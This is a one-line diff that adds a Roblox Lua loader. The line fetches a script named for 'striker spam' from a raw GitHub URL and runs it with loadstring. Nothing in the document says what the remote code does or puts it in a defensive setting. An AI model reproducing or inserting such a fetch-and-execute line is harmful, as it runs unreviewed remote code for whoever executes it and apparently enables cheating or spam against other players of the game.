@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/international-become-a-striker-spam3-1029fl19odto8h.lua"))()
